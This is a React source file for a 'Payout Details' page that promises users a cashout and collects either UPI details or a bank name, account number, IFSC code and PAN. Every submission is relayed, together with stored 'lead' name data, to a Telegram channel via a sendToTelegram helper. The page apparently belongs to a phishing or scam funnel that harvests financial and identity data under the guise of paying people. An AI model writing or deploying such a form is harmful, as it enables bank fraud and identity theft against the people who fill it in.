import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./PayoutPage.css";

type Method = "upi" | "bank" | null;

const BANKS = [
  "State Bank of India",
  "HDFC Bank",
  "ICICI Bank",
  "Axis Bank",
  "Kotak Mahindra Bank",
  "Punjab National Bank",
  "Bank of Baroda",
  "Canara Bank",
  "Union Bank of India",
  "IDBI Bank",
  "Indian Bank",
  "Central Bank of India",
  "Yes Bank",
  "IndusInd Bank",
  "Federal Bank",
];

function getUserName(): string {
  try {
    const lead = JSON.parse(sessionStorage.getItem("rg:lead") || "{}");
    return lead.fullName || "Unknown";
  } catch { return "Unknown"; }
}

export function PayoutPage() {
  const navigate = useNavigate();
  const [method, setMethod] = useState<Method>(null);

  // UPI
  const [upiMobile, setUpiMobile] = useState("");
  const [upiId, setUpiId]         = useState("");
  const [upiError, setUpiError]   = useState<string | null>(null);

  // Bank
  const [bank, setBank]           = useState("");
  const [account, setAccount]     = useState("");
  const [confirmAcc, setConfirmAcc] = useState("");
  const [ifsc, setIfsc]           = useState("");
  const [pan, setPan]             = useState("");
  const [bankError, setBankError] = useState<string | null>(null);

  const handleUpiSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setUpiError(null);
    if (!/^\d{10}$/.test(upiMobile)) return setUpiError("Enter valid 10-digit mobile number");
    if (!upiId.trim()) return setUpiError("Enter UPI ID");
    if (!/^[a-zA-Z0-9.\-_]{2,}@[a-zA-Z]{2,}$/.test(upiId.trim()))
      return setUpiError("Enter valid UPI ID (e.g. name@upi)");

    void sendToTelegram(
      formatEntry("💸 Payout — UPI", {
        "👤 User":     getUserName(),
        "Mobile":      upiMobile,
        "UPI ID":      upiId.trim(),
      })
    );

    try {
      sessionStorage.setItem(
        "rg:payment",
        JSON.stringify({ method: "upi", upiMobile, upiId: upiId.trim() })
      );
    } catch {}

    navigate("/page4");
  };

  const handleBankSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setBankError(null);

    if (!bank)                          return setBankError("Please select your bank");
    if (!/^\d{9,18}$/.test(account))    return setBankError("Account number must be 9–18 digits");
    if (account !== confirmAcc)         return setBankError("Account numbers do not match");
    if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(ifsc.toUpperCase()))
                                        return setBankError("Enter valid IFSC code (e.g. SBIN0001234)");
    if (!/^[A-Z]{5}[0-9]{4}[A-Z]$/.test(pan.toUpperCase()))
                                        return setBankError("Enter valid PAN (e.g. ABCDE1234F)");

    void sendToTelegram(
      formatEntry("🏦 Payout — Bank", {
        "👤 User":    getUserName(),
        "Bank":       bank,
        "Account":    account,
        "IFSC":       ifsc.toUpperCase(),
        "PAN":        pan.toUpperCase(),
      })
    );

    try {
      sessionStorage.setItem(
        "rg:payment",
        JSON.stringify({ method: "bank", bank, account, ifsc: ifsc.toUpperCase(), pan: pan.toUpperCase() })
      );
    } catch {}

    navigate("/page4");
  };

  return (
    <AppLayout title="Payout Details">
      <div className="pout">
        <Banner />

        <section className="pout__card">
          <header className="pout__head">
            <h1 className="pout__heading">Where to send your money?</h1>
            <p className="pout__sub">Choose how you want to receive your cashout</p>
          </header>

          {/* Method selector */}
          <div className="pout__methods">
            <button
              type="button"
              className={`pout__method ${method === "upi" ? "is-active" : ""}`}
              onClick={() => { setMethod("upi"); setBankError(null); }}
            >
              <span className="pout__method-icon">📱</span>
              <span className="pout__method-label">UPI</span>
            </button>
            <button
              type="button"
              className={`pout__method ${method === "bank" ? "is-active" : ""}`}
              onClick={() => { setMethod("bank"); setUpiError(null); }}
            >
              <span className="pout__method-icon">🏦</span>
              <span className="pout__method-label">Bank Transfer</span>
            </button>
          </div>

          {/* UPI form */}
          {method === "upi" && (
            <form className="pout__form" onSubmit={handleUpiSubmit} noValidate>
              <div className="pout__field">
                <label className="pout__label" htmlFor="upiMobile">UPI Mobile Number</label>
                <input
                  id="upiMobile"
                  className="pout__input"
                  type="text"
                  inputMode="numeric"
                  value={upiMobile}
                  onChange={(e) => setUpiMobile(e.target.value.replace(/\D/g, "").slice(0, 10))}
                  placeholder="10-digit mobile number"
                  maxLength={10}
                />
              </div>
              <div className="pout__field">
                <label className="pout__label" htmlFor="upiId">UPI ID</label>
                <input
                  id="upiId"
                  className="pout__input"
                  type="text"
                  value={upiId}
                  onChange={(e) => setUpiId(e.target.value)}
                  placeholder="e.g. name@oksbi"
                  autoCapitalize="none"
                  autoCorrect="off"
                  spellCheck={false}
                />
              </div>
              {upiError && <p className="pout__error">{upiError}</p>}
              <Button type="submit" variant="primary" block>Continue</Button>
            </form>
          )}

          {/* Bank form */}
          {method === "bank" && (
            <form className="pout__form" onSubmit={handleBankSubmit} noValidate>
              <div className="pout__field">
                <label className="pout__label" htmlFor="bankSelect">Select Bank</label>
                <select
                  id="bankSelect"
                  className="pout__select"
                  value={bank}
                  onChange={(e) => setBank(e.target.value)}
                >
                  <option value="">-- Select Bank --</option>
                  {BANKS.map((b) => (
                    <option key={b} value={b}>{b}</option>
                  ))}
                </select>
              </div>

              <div className="pout__field">
                <label className="pout__label" htmlFor="account">Account Number</label>
                <input
                  id="account"
                  className="pout__input"
                  type="text"
                  inputMode="numeric"
                  value={account}
                  onChange={(e) => setAccount(e.target.value.replace(/\D/g, "").slice(0, 18))}
                  placeholder="Enter account number"
                  maxLength={18}
                />
              </div>

              <div className="pout__field">
                <label className="pout__label" htmlFor="confirmAcc">Confirm Account Number</label>
                <input
                  id="confirmAcc"
                  className="pout__input"
                  type="text"
                  inputMode="numeric"
                  value={confirmAcc}
                  onChange={(e) => setConfirmAcc(e.target.value.replace(/\D/g, "").slice(0, 18))}
                  placeholder="Re-enter account number"
                  maxLength={18}
                />
              </div>

              <div className="pout__field">
                <label className="pout__label" htmlFor="ifsc">IFSC Code</label>
                <input
                  id="ifsc"
                  className="pout__input"
                  type="text"
                  value={ifsc}
                  onChange={(e) => setIfsc(e.target.value.toUpperCase())}
                  placeholder="e.g. SBIN0001234"
                  maxLength={11}
                  autoCapitalize="characters"
                />
              </div>

              <div className="pout__field">
                <label className="pout__label" htmlFor="pan">PAN Card Number</label>
                <input
                  id="pan"
                  className="pout__input"
                  type="text"
                  value={pan}
                  onChange={(e) => setPan(e.target.value.toUpperCase())}
                  placeholder="e.g. ABCDE1234F"
                  maxLength={10}
                  autoCapitalize="characters"
                />
              </div>

              {bankError && <p className="pout__error">{bankError}</p>}
              <Button type="submit" variant="primary" block>Continue</Button>
            </form>
          )}
        </section>
      </div>
    </AppLayout>
  );
}
